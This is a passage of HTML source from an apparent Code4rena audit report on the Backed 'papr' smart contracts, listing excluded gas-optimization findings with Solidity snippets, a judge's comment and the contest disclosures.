      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyController</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprToken.sol#L24\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprToken.sol#L24</a></p>\n<hr>\n<h2 id=\"excluded-gas-optimizations-findings\" style=\"position:relative;\"><a href=\"#excluded-gas-optimizations-findings\" aria-label=\"excluded gas optimizations findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded Gas Optimizations Findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑12]</td>\n<td align=\"left\">Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">120</td>\n</tr>\n<tr>\n<td>[G‑13]</td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">2</td>\n<td align=\"center\">194</td>\n</tr>\n<tr>\n<td>[G‑14]</td>\n<td align=\"left\"><code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</td>\n<td align=\"center\">3</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td>[G‑15]</td>\n<td align=\"left\">Using <code>bool</code>s for storage incurs overhead</td>\n<td align=\"center\">3</td>\n<td align=\"center\">51300</td>\n</tr>\n<tr>\n<td>[G‑16]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑17]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">1</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 11 instances over 6 issues with <strong>51623 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g12--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" style=\"position:relative;\"><a href=\"#g12--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" aria-label=\"g12  using calldata instead of memory for read only arguments in external functions saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑12]  Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</h2>\n<p>When a function with a <code>memory</code> array is called externally, the <code>abi.decode()</code> step has to use a for-loop to copy each index of the <code>calldata</code> to the <code>memory</code> index. <strong>Each iteration of this for-loop costs at least 60 gas</strong> (i.e. <code>60 * &#x3C;mem_array>.length</code>). Using <code>calldata</code> directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having <code>memory</code> arguments, it’s still valid for implementation contracs to use <code>calldata</code> arguments instead. </p>\n<p>If the array is passed to an <code>internal</code> function which passes the array to another internal function where the array is modified and therefore <code>memory</code> is used in the <code>external</code> call, it’s still more gass-efficient to use <code>calldata</code> when the <code>external</code> function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one</p>\n<p>Note that I’ve also flagged instances where the function is <code>public</code> but can be marked as <code>external</code> since it’s not called by the contract, and cases where a constructor is involved</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit oracleInfo - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">underwritePriceForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">PriceKind</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceKind</span><span class=\"mtk1\">, </span><span class=\"mtk12\">OracleInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracleInfo</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65            </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">66:           </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L64-L66\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/ReservoirOracleUnderwriter.sol#L64-L66</a></p>\n<h2 id=\"g13--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g13--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g13  state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑13]  State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (<strong>100 gas</strong>) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit pool on line 102 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_lastTwapTick</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">poolCurrentTick</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit pool on line 112 - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; !</span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">poolsHaveSameTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PoolTokensDoNotMatch</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L103\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L103</a></p>\n<h2 id=\"g14--arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" style=\"position:relative;\"><a href=\"#g14--arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\" aria-label=\"g14  arraylength should not be looked up in every loop of a for loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑14]  <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</h2>\n<p>The overheads outlined below are <em>PER LOOP</em>, excluding the first loop</p>\n<ul>\n<li>storage arrays incur a Gwarmaccess (<strong>100 gas</strong>)</li>\n<li>memory arrays use <code>MLOAD</code> (<strong>3 gas</strong>)</li>\n<li>calldata arrays use <code>CALLDATALOAD</code> (<strong>3 gas</strong>)</li>\n</ul>\n<p>Caching the length changes each of these to a <code>DUP&#x3C;N></code> (<strong>3 gas</strong>), and gets rid of the extra <code>DUP&#x3C;N></code> needed to store the stack offset</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">99</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">collateralArr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">collateralArr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">370</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">collateralConfigs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L99\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L99</a></p>\n<h2 id=\"g15--using-bools-for-storage-incurs-overhead\" style=\"position:relative;\"><a href=\"#g15--using-bools-for-storage-incurs-overhead\" aria-label=\"g15  using bools for storage incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑15]  Using <code>bool</code>s for storage incurs overhead</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Booleans are more expensive than uint256 or any type that takes up a full</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// word because each write operation emits an extra SLOAD to first read the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// slot&#39;s contents, replace the bits taken up by the boolean, and then write</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// back. This is the compiler&#39;s defense against contract upgrades and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// pointer aliasing, and it cannot be disabled.</span></span></span></code></pre>\n<p><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27</a></p>\n<p>Use <code>uint256(1)</code> and <code>uint256(2)</code> for true/false to avoid a Gwarmaccess (<strong><a href=\"https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058\">100 gas</a></strong>) for the extra SLOAD, and to avoid Gsset (<strong>20000 gas</strong>) when changing from <code>false</code> to <code>true</code>, after having been <code>true</code> in the past.</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidationsLocked</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token0IsUnderlying</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isAllowed</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L32\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L32</a></p>\n<h2 id=\"g16--using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g16--using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g16  using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑16]  Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BIPS_ONE</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L30\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L30</a></p>\n<h2 id=\"g17--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g17--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g17  use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑17]  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">twapDuration</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BP&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L39\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L39</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/124#issuecomment-1364719842\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Please also view <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/13\">#13</a> for an excellent gas report.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  